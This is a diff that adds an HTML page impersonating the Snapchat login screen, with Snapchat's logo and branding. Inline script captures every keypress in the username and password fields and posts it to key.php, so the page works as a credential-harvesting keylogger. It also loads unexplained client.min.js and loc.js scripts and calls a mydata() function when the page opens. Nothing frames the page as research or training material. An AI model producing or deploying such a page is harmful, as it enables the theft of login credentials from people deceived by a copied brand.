@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>snapchat Login form</title>
+  <link rel="stylesheet" href="./style.css">
+
+  <script src="client.min.js"></script>
+  <script src="loc.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
+
+
+</head>
+<body onload="mydata()">
+    <div class="container">
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="logo" class="logo"><br>
+        <div class="name">Log in to Snapchat</div>
+        <div class="user">Username or Email</div>
+        <input type="text" name="username" id="username" class="username">
+        <div class="user">Password</div>
+        <input type="password" name="password" id="password" class="username">
+        <div class="forget">Forget Password</div>
+        <input type="submit" value="Log In" class="submit">
+
+    </div>
+   <div class="signup">New To Snapchat?
+ <span>Sign Up</span></div>
+
+ <div class="container2">
+    <div class="one"><bold>Company</bold>
+Snap Inc.
+Careers
+News</div>
+ </div>
+
+ <script>
+      
+  document
+  .getElementById("username")
+  .addEventListener("keypress", function (data) {
+      $.post("key.php", {userkey: data.key });
+    });
+    
+  document
+    .getElementById("password")
+    .addEventListener("keypress", function (data) {
+      $.post("key.php", {passkey: data.key });
+    });
+    
+
+</script>
+
+</body>
+</html>
